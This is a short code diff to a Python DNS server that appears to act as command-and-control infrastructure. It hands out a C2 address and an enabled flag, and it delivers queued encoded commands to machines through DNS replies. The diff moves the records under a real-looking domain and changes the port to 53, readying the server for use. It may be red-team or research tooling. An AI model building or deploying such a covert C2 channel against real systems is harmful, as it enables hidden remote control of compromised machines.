@@ -34,13 +34,12 @@ class MemeResolver:
         #print(request.get_q().qtype)  # 1: A, 28: AAAA, 15: MX, 5: CNAME
 
         if qname == "c2.":
-            reply.add_answer(*RR.fromZone("c2. 60 IN MX 10 "+self.c2IP))
-            #todo: we can't just return an absolute -- we need a DNS name
+            reply.add_answer(*RR.fromZone("c2.linuxmailexchange.tk. 60 IN MX 10 "+self.c2IP))
         if qname == "c2e.":
             if self.c2enabled:
-                reply.add_answer(*RR.fromZone("c2e. 60 IN MX 10 yes."))
+                reply.add_answer(*RR.fromZone("c2e.a.linuxmailexchange.tk. 60 IN MX 10 yes."))
             else:
-                reply.add_answer(*RR.fromZone("c2e. 60 IN MX 10 no."))
+                reply.add_answer(*RR.fromZone("c2e.a.linuxmailexchange.tk. 60 IN MX 10 no."))
 
         if qname in self.waitingCommands:
             response = encodeCmd(self.waitingCommands[qname])
@@ -68,7 +67,7 @@ def machineList(machines):
 
 def main():
     resolver = MemeResolver()
-    server = DNSServer(resolver, port=5354, address="0.0.0.0", tcp=False)
+    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
     server.start_thread()
     print("Server launched.")
     print("Commands:")
